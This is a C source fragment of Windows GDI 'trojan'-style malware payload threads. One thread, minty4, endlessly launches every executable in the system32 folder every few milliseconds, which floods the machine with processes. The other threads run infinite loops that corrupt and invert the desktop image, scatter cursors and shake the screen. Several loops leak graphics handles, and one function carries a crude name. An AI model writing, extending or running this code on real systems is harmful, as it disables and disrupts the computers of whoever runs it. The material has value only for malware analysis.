DWORD WINAPI minty4(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(2);
        }
    }
}

DWORD WINAPI cur(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        DrawIcon(hdc, rand() % w, rand() % h, LoadCursor(NULL, IDC_ARROW));
        Sleep(0);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI GAY(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);

    BITMAPINFO bmpi = { 0 };

    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);

    int radius = 25.f;
    double angle = 0;

    while (1) {
        HDC hdc = GetDC(0);

        float x = (cos(angle)) * radius;
        float y = (sin(angle)) * radius;

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, 0, rand() % 255));
        SelectObject(hdc, brush);

        BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, PATPAINT);
        BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCCOPY);
        StretchBlt(hdc, x, y, sw - x * 2, sh - x * 2, hdc, 0, 0, sw, sh, SRCCOPY);

        DeleteObject(brush);
        ReleaseDC(0, hdc);

        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
}
DWORD WINAPI GA(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCINVERT);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
        StretchBlt(hdc, -1, -1, w + 2, h + 2, hdc, 0, 0, w, h, SRCERASE);
        ReleaseDC(0, hdc);
    }
    return 0;
} 
DWORD WINAPI G(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1) {
        HDC hdc = GetDC(0);

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);

        BitBlt(hdc, -3, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, w - 3, 0, w, h, hdc, 0, 0, SRCCOPY);

        StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);

        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);

        DeleteObject(brush);

        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI A(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    int maxOffset = 2;

    while (1) {
        HDC desk = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desk);

        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);
        SelectObject(memDC, hbm);

        BitBlt(memDC, 0, 0, w, h, desk, 0, 0, SRCCOPY);

        int offsetX = (rand() % (2 * maxOffset)) - maxOffset;
        int offsetY = (rand() % (2 * maxOffset)) - maxOffset;

        BitBlt(desk, offsetX, offsetY, w, h, memDC, 0, 0, SRCCOPY);

        DeleteObject(hbm);
        DeleteDC(memDC);

        ReleaseDC(NULL, desk);
    }
}
